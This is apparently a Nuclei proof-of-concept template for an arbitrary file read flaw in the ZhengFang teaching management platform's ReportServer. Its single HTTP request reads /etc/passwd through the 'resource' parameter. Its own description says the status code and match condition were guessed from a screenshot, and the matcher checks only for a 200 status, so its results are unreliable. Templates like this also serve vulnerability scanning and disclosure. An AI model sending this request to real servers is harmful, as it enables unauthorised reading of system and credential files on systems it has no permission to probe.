id: poc-gx0h2ta92i7qs3ia
info:
  name: 正方教学管理信息服务平台ReportServer存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2024
http:
- raw:
  - 'GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Content-Length: 0'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
